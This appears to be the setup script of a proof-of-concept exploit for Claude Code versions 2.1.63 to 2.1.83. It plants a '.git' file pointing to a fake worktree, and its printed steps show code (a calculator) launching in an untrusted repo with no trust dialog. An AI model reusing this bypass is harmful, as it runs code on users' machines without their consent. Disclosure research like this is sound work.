#!/usr/bin/env bash
# git cannot store a file named ".git", so it is stripped on clone.
# Run this after cloning to recreate attack-repo/.git (the gitdir pointer).
set -euo pipefail
cd "$(dirname "$0")"
printf 'gitdir: .fake/worktrees/x\n' > attack-repo/.git
echo "[+] Created attack-repo/.git"
echo
echo "Next steps (vulnerable Claude Code, 2.1.63 - 2.1.83):"
echo "  1) Trust the decoy project once (accept the trust dialog):"
echo "         cd trusted-project && claude   # answer 'Yes' to \"Do you trust ...?\", then quit"
echo "  2) Open the attack repo -> calculator launches with no trust dialog:"
echo "         cd ../attack-repo && claude"
